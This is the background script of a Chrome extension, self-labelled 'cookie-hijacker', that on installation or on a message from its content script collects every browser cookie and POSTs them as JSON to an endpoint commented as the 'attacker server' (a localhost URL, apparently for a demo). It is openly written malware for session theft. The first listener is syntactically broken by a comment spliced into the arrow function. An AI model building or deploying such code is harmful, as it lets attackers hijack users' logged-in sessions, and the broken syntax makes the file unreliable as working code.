// Converted to MV3 Service Worker
// Load and steal all cookies when extension is installed
chrome.runtime.onInstalled.addListener(()
// Note: Service workers don't persist, adjust logic accordingly => {
  stealAllCookies();
});

// Listen for messages from content script
chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
  if (request.action === 'stealCookies') {
    stealAllCookies();
  }
});

function stealAllCookies() {
  chrome.cookies.getAll({}, cookies => {
    console.log('[cookie-hijacker] Stealing', cookies.length, 'cookies');
    
    // Send to attacker server
    fetch('http://localhost:8000/stolen', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        type: 'cookies',
        data: cookies,
        timestamp: new Date().toISOString()
      })
    }).then(() => {
      console.log('[cookie-hijacker] Cookies sent to attacker');
    }).catch(err => {
      console.error('[cookie-hijacker] Failed to send cookies:', err);
    });
  });
} 